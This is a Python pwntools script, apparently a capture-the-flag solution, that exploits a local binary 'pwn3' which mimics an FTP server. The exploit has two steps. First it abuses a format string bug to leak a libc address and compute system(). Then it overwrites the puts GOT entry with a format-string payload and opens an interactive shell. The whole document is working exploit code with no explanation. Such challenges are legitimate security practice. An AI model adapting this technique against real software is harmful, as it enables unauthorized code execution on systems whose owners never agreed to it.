from pwn import *

p = process('./pwn3')
libc = ELF('libc.so')
elf = ELF('pwn3')
context.log_level = 'debug'

p.recvuntil('Name (ftp.hacker.server:Rainism):')
p.sendline('rxraclhm')
p.recvuntil('ftp>')
p.sendline('put')
p.recvuntil('please enter the name of the file you want to upload:')
p.sendline('/sh')
p.recvuntil('then, enter the content:')
p.sendline('%91$p')
p.recvuntil('ftp>')
p.sendline('get')
p.recvuntil('enter the file name you want to get:')
p.sendline('/sh')

libc_addr = int(p.recv(10),16)
print libc_addr
libc_real = libc_addr - 247
libc_base = libc_real - libc.symbols['__libc_start_main']
sys_addr = libc_base + libc.symbols['system']
#gdb.attach(p)
print hex(sys_addr)

put_got = elf.got['puts']
playload = fmtstr_payload(7, {put_got: sys_addr})
p.recvuntil('ftp>')
p.sendline('put')
p.recvuntil('please enter the name of the file you want to upload:')
p.sendline('/bin')
p.recvuntil('then, enter the content:')
p.sendline(playload)
p.recvuntil('ftp>')
p.sendline('get')
p.recvuntil('enter the file name you want to get:')
p.sendline('/bin')
#gdb.attach(p)
p.recvuntil('ftp>')
gdb.attach(p)
p.sendline('dir')
p.interactive()
